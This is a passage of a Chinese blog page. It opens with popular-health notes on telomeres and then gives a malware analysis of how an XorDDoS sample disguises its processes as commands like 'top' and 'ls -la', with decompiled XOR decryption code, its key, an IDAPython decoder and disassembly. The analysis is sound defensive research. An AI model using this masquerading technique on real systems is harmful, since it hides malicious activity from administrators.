-<li>细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」</li>
-<li>抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡</li>
-<li>锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道</li>
-</ul>
-<p>两种科学的锻炼方法</p>
-<ul>
-<li>有氧耐力训练：长跑，每次跑四十五分钟，每周跑三次，坚持六个月，你的端粒酶的活性就能提高两倍</li>
-<li>高强度的间歇训练：短跑结合恢复的办法，快跑几分钟，停下来慢走休息，然后再快跑</li>
-</ul>
-<p>节食和减肥的观念</p>
-<ul>
-<li>体重可能并不是肥胖的最好指标，更好的指标是 「腰臀比」</li>
-<li>肚子大代表新陈代谢水平低，会让端粒变短</li>
-<li>肚子大，腰臀比过高，胆固醇超标；高血压；胰岛素抵抗，具备三个就是新陈代谢综合症</li>
-<li>饥饿节食减肥不可取，就算减下体重也很容易报复性反弹</li>
-<li>糖可能是各种健康问题的罪魁祸首</li>
-</ul>
-<p>从端粒说，细胞有三个敌人</p>
-<ul>
-<li>细胞发炎：肥胖使细胞容易发炎，从而使端粒变短。omega-3 可以防止细胞发炎，鱼类、牛奶、有机鸡蛋中含有 omega-3 脂肪酸</li>
-<li>氧化应激反应：维生素 C 和维生素 E 可以对抗氧化应急反应。饮食中可以吃些水果、胡萝卜、西红柿、土豆和绿叶蔬菜</li>
-<li>胰岛素抵抗：对抗胰岛素抵抗，关键是要少吃糖</li>
-</ul>
-<p>从看端粒的角度分析饮食</p>
-<ul>
-<li>对端粒有害的食物有：红肉，加工肉类（香肠）、白面包、含糖饮料、omega-6 ，过量饮酒</li>
-<li>对端粒有益的食物有：植物纤维、全麦、蔬菜、坚果、豆类、水果、海带、omega-3</li>
-</ul>
-<p>人的环境对端粒的影响</p>
-<ul>
-<li>城市的居民比乡村居民更容易视压力为威胁，因为城市居民的“杏仁核” 部位比较活跃，这个部位主要负责恐惧感</li>
-<li>社会关系比金钱对端粒的影响更大，只要能满足基本的生活需求，金钱对端粒的影响就不大</li>
-<li>受教育的程度对端粒影响很大，研究表明受教育程度越高端粒越长</li>
-<li>职业很重要比收入对端粒影响大，一个从事基本工作的白领也比收入更高的蓝领端粒要长</li>
-</ul>
-<p>从端粒看，父母对孩子的影响</p>
-<ul>
-<li>遗传：端粒长度可以不通过基因遗传，而是“直接传递”，怀孕时父母的端粒比较短，孩子出生时端粒也就比较短</li>
-<li>孕期压力：怀孕期间母亲的压力情况，人遇到压力会分泌皮质醇，从而影响孩子的端粒</li>
-<li>家庭环境：越少父母的关爱，被父母忽视的孩子，端粒会比较短</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/xorddos_hide/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/xorddos_hide/" class="post-title-link" itemprop="url">xorddos 样本进程隐藏的小伎俩</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><p>上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，<br>变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ps -ef  | grep /usr/bin</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helper</span><br><span class="line">root      4598  4594  0 00:37 pts/1    00:00:00 bash</span><br><span class="line">oracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcl</span><br><span class="line">oracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcl</span><br><span class="line">oracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcl</span><br><span class="line">oracle    5588     1  0 00:42 ?        00:00:00 ora_j001_orcl</span><br><span class="line">root      5666     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5669     1  0 00:43 ?        00:00:00 <span class="built_in">echo</span> <span class="string">&quot;find&quot;</span></span><br><span class="line">root      5672     1  0 00:43 ?        00:00:00 <span class="built_in">ls</span> -la</span><br><span class="line">root      5675     1  0 00:43 ?        00:00:00 bash</span><br><span class="line">root      5678     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5683     1  0 00:43 ?        00:00:00 <span class="built_in">cd</span> /etc</span><br><span class="line">root      5686     1  0 00:43 ?        00:00:00 top</span><br><span class="line">root      5689     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5692     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5695     1  0 00:43 ?        00:00:00 ifconfig</span><br><span class="line">root      5696  4598  0 00:43 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
-
-<p>而使用lsof却可以清除地看见样本正在努力地干活。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># lsof +d /usr/bin</span></span><br><span class="line">COMMAND    PID USER  FD   TYPE DEVICE    SIZE    NODE NAME</span><br><span class="line">hidd      1853 root txt    REG    3,1   33708 2467454 /usr/bin/hidd</span><br><span class="line">ckucbzknt 2014 root txt    REG    3,1  610331 2459176 /usr/bin/ckucbzkntb</span><br><span class="line">xfs       2143  xfs txt    REG    3,1  107460 2468483 /usr/bin/xfs</span><br><span class="line">Xorg      3117 root txt    REG    3,1 1890596 2466732 /usr/bin/Xorg</span><br><span class="line">gnome-ses 4073 root txt    REG    3,1  129356 2459482 /usr/bin/gnome-session</span><br><span class="line">ssh-agent 4201 root txt    REG    3,1   88996 2467513 /usr/bin/ssh-agent</span><br><span class="line">dbus-laun 4245 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-key 4255 root txt    REG    3,1   97396 2473617 /usr/bin/gnome-keyring-daemon</span><br><span class="line">metacity  4290 root txt    REG    3,1  521080 2464500 /usr/bin/metacity</span><br><span class="line">gnome-pan 4296 root txt    REG    3,1  540868 2465177 /usr/bin/gnome-panel</span><br><span class="line">nautilus  4298 root txt    REG    3,1 1348932 2461620 /usr/bin/nautilus</span><br><span class="line">gnome-vol 4310 root txt    REG    3,1   65240 2464498 /usr/bin/gnome-volume-manager</span><br><span class="line">bt-applet 4334 root txt    REG    3,1   30452 2464773 /usr/bin/bt-applet</span><br><span class="line">nm-applet 4352 root txt    REG    3,1  312432 2467723 /usr/bin/nm-applet</span><br><span class="line">gnome-pow 4381 root txt    REG    3,1  195284 2459473 /usr/bin/gnome-power-manager</span><br><span class="line">pam-panel 4383 root txt    REG    3,1   39148 2461862 /usr/bin/pam-panel-icon</span><br><span class="line">dbus-laun 4473 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-scr 4512 root txt    REG    3,1  168628 2468487 /usr/bin/gnome-screensaver</span><br><span class="line">gnome-ter 4594 root txt    REG    3,1  309368 2464648 /usr/bin/gnome-terminal</span><br><span class="line">gadcgkcqn 4681 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4684 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4687 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4690 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4693 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br></pre></td></tr></table></figure>
-
-<p>阅读汇编代码，分析具体原因，发现xorddos将一些关键信息加密了，F5处理过的代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">encrypt_code</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ecx@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>)</span><br><span class="line">                                   - ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)];</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != a2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>xorkey 为 BB2FA36AAA9541F0</p>
-<p>用idapython 写个小脚本，简单处理一下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">addr</span>):</span><br><span class="line">  out = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> Byte(addr) != <span class="number">0</span>:</span><br><span class="line">      out += <span class="built_in">chr</span>(Byte(addr))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">  xorkey = <span class="string">&#x27;BB2FA36AAA9541F0&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(data)</span><br><span class="line">  o = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> length &gt; <span class="number">0</span>:</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2 &lt; length:</span><br><span class="line">      o += <span class="built_in">chr</span>( <span class="built_in">ord</span>(data[v2]) ^  <span class="built_in">ord</span>(xorkey[((v2 + ((v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>) - ( (v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)]) )</span><br><span class="line">      v2 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">ea = ScreenEA()</span><br><span class="line">string = get_string(ea)</span><br><span class="line">dec = decrypt(string)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Addr: 0x%x, %s&#x27;</span> % (ea, dec)</span><br><span class="line">MakeComm(ea, dec)</span><br></pre></td></tr></table></figure>
-
-<p>处理后可以看到伪装的命令行信息，daemonname。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.data:080CBB40 daemonname      db &#x27;!#Ff3VE.-7&#x27;,17h,&#x27;V[_ 0&#x27;,0 ; DATA XREF: main+31Eo</span><br><span class="line">.data:080CBB40                                         ; main+4AEo ...</span><br><span class="line">.data:080CBB40                                         ; cat resolv.conf</span><br><span class="line">.data:080CBB51                 align 4</span><br><span class="line">.data:080CBB54 a12             db &#x27;1*2&#x27;,0              ; sh</span><br><span class="line">.data:080CBB58                 db    0</span><br><span class="line">.data:080CBB59                 db    0</span><br><span class="line">.data:080CBB5A                 db    0</span><br><span class="line">.data:080CBB5B                 db    0</span><br><span class="line">.data:080CBB5C                 db    0</span><br><span class="line">.data:080CBB5D                 db    0</span><br><span class="line">.data:080CBB5E                 db    0</span><br><span class="line">.data:080CBB5F                 db    0</span><br><span class="line">.data:080CBB60                 db    0</span><br><span class="line">.data:080CBB61                 db    0</span><br><span class="line">.data:080CBB62                 db    0</span><br><span class="line">.data:080CBB63                 db    0</span><br><span class="line">.data:080CBB64                 db    0</span><br><span class="line">.data:080CBB65                 db    0</span><br><span class="line">.data:080CBB66                 db    0</span><br><span class="line">.data:080CBB67                 db    0</span><br><span class="line">.data:080CBB68                 db  20h                 ; bash</span><br><span class="line">.data:080CBB69                 db  23h ; #</span><br><span class="line">.data:080CBB6A                 db  41h ; A</span><br><span class="line">.data:080CBB6B                 db  2Eh ; .</span><br><span class="line">.data:080CBB6C                 db  41h ; A</span><br><span class="line">.data:080CBB6D                 db    0</span><br><span class="line">.data:080CBB6E                 db    0</span><br><span class="line">.data:080CBB6F                 db    0</span><br><span class="line">.data:080CBB70                 db    0</span><br><span class="line">.data:080CBB71                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.data:080CBBB8                 db  2Eh ; .             ; ls -la</span><br><span class="line">.data:080CBBB9                 db  31h ; 1</span><br><span class="line">.data:080CBBBA                 db  12h</span><br><span class="line">.data:080CBBBB                 db  6Bh ; k</span><br><span class="line">.data:080CBBBC                 db  2Dh ; -</span><br><span class="line">.data:080CBBBD                 db  52h ; R</span><br><span class="line">.data:080CBBBE                 db  36h ; 6</span><br><span class="line">.data:080CBBBF                 db    0</span><br><span class="line">.data:080CBBC0                 db    0</span><br><span class="line">.data:080CBBC1                 db    0</span><br><span class="line">.data:080CBBC2                 db    0</span><br><span class="line">.data:080CBBC3                 db    0</span><br><span class="line">.data:080CBBC4                 db    0</span><br><span class="line">.data:080CBBC5                 db    0</span><br><span class="line">.data:080CBBC6                 db    0</span><br><span class="line">.data:080CBBC7                 db    0</span><br><span class="line">.data:080CBBC8                 db    0</span><br><span class="line">.data:080CBBC9                 db    0</span><br><span class="line">.data:080CBBCA                 db    0</span><br><span class="line">.data:080CBBCB                 db    0</span><br><span class="line">.data:080CBBCC                 db  36h ; 6             ; top</span><br><span class="line">.data:080CBBCD                 db  2Dh ; -</span><br><span class="line">.data:080CBBCE                 db  42h ; B</span><br><span class="line">.data:080CBBCF                 db  46h ; F</span><br><span class="line">.data:080CBBD0                 db    0</span><br><span class="line">.data:080CBBD1                 db    0</span><br><span class="line">.data:080CBBD2                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>呵呵，已经看到 top， ls -al 等信息了，查看daemonname 的交叉引用，发现在main函数<br>中，到main里看看。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804AC30 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0804AC30                 public main</span><br><span class="line">.text:0804AC30 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:0804AF4E                 mov     ebx, offset daemonname ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.text:0804AFC2 loc_804AFC2:                            ; CODE XREF: main+3ABj</span><br><span class="line">.text:0804AFC2                 mov     [esp], ebx</span><br><span class="line">.text:0804AFC5                 add     ebx, 14h</span><br><span class="line">.text:0804AFC8                 mov     dword ptr [esp+4], 14h</span><br><span class="line">.text:0804AFD0                 call    encrypt_code</span><br><span class="line">.text:0804AFD5                 cmp     ebx, offset unk_80CBD0C</span><br><span class="line">.text:0804AFDB                 jnz     short loc_804AFC2</span><br></pre></td></tr></table></figure>
-
-<p>这段汇编代码，使用了一个循环，调用encrypt_code 对daemonname进行了解密。<br>后面的代码，用到了daemonname的地方有下面几处，</p>
-<p>第一处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B29F                 call    getpid</span><br><span class="line">.text:0804B2A4                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B2AC                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B2B4                 mov     [esp], esi             ；第三形参 pid</span><br><span class="line">.text:0804B2B7                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B2BB                 call    snprintf</span><br><span class="line">.text:0804B2C0                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B2C8                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B2CF                 call    randomid</span><br><span class="line">.text:0804B2D4                 mov     [esp+8], esi</span><br><span class="line">.text:0804B2D8                 mov     [esp], edi             ；第一形参 要跑的木马</span><br><span class="line">.text:0804B2DB                 movzx   eax, ax</span><br><span class="line">.text:0804B2DE                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B2E1                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B2E8                 mov     [esp+4], eax           ; 第二形参  daemonname</span><br><span class="line">.text:0804B2EC                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure>
-
-<p>第二处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B932                 lea     edx, [ebp+var_1888]</span><br><span class="line">.text:0804B938                 add     ebx, 1</span><br><span class="line">.text:0804B93B                 mov     [esp], edx</span><br><span class="line">.text:0804B93E                 call    randmd5</span><br><span class="line">.text:0804B943                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B94A                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B951                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804B957                 call    getpid</span><br><span class="line">.text:0804B95C                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B964                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B96C                 mov     [esp], esi</span><br><span class="line">.text:0804B96F                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B973                 call    snprintf</span><br><span class="line">.text:0804B978                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B980                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B987                 call    randomid</span><br><span class="line">.text:0804B98C                 mov     [esp+8], esi</span><br><span class="line">.text:0804B990                 movzx   eax, ax</span><br><span class="line">.text:0804B993                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B996                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B99D                 mov     [esp+4], eax</span><br><span class="line">.text:0804B9A1                 lea     eax, [ebp+var_1888]</span><br><span class="line">.text:0804B9A7                 mov     [esp], eax</span><br><span class="line">.text:0804B9AA                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure>
-
-<p>第三处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B9DF                 lea     edx, [ebp+var_1C88]</span><br><span class="line">.text:0804B9E5                 add     ebx, 1</span><br><span class="line">.text:0804B9E8                 mov     [esp], edx</span><br><span class="line">.text:0804B9EB                 call    randmd5</span><br><span class="line">.text:0804B9F0                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B9F7                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B9FE                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804BA04                 call    getpid</span><br><span class="line">.text:0804BA09                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804BA11                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804BA19                 mov     [esp], esi</span><br><span class="line">.text:0804BA1C                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804BA20                 call    snprintf</span><br><span class="line">.text:0804BA25                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804BA2D                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804BA34                 call    randomid</span><br><span class="line">.text:0804BA39                 mov     [esp+8], esi</span><br><span class="line">.text:0804BA3D                 movzx   eax, ax</span><br><span class="line">.text:0804BA40                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804BA43                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804BA4A                 mov     [esp+4], eax</span><br><span class="line">.text:0804BA4E                 lea     eax, [ebp+var_1C88]</span><br><span class="line">.text:0804BA54                 mov     [esp], eax</span><br><span class="line">.text:0804BA57                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure>
-
-<p>都是作为LinuxExec_Argv2 参数使用的，接着来看LinuxExec_Argv2 的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:08048520 LinuxExec_Argv2 proc near               ; CODE XREF: DelService+B3p</span><br><span class="line">.text:08048520                                         ; DelService+CBlp ...</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520 argv            = dword ptr -18h</span><br><span class="line">.text:08048520 var_14          = dword ptr -14h</span><br><span class="line">.text:08048520 var_10          = dword ptr -10h</span><br><span class="line">.text:08048520 var_C           = dword ptr -0Ch</span><br><span class="line">.text:08048520 var_8           = dword ptr -8</span><br><span class="line">.text:08048520 var_4           = dword ptr -4</span><br><span class="line">.text:08048520 file            = dword ptr  8</span><br><span class="line">.text:08048520 arg_4           = dword ptr  0Ch</span><br><span class="line">.text:08048520 arg_8           = dword ptr  10h</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520                 push    ebp</span><br><span class="line">.text:08048521                 mov     ebp, esp</span><br><span class="line">.text:08048523                 sub     esp, 28h</span><br><span class="line">.text:08048526                 mov     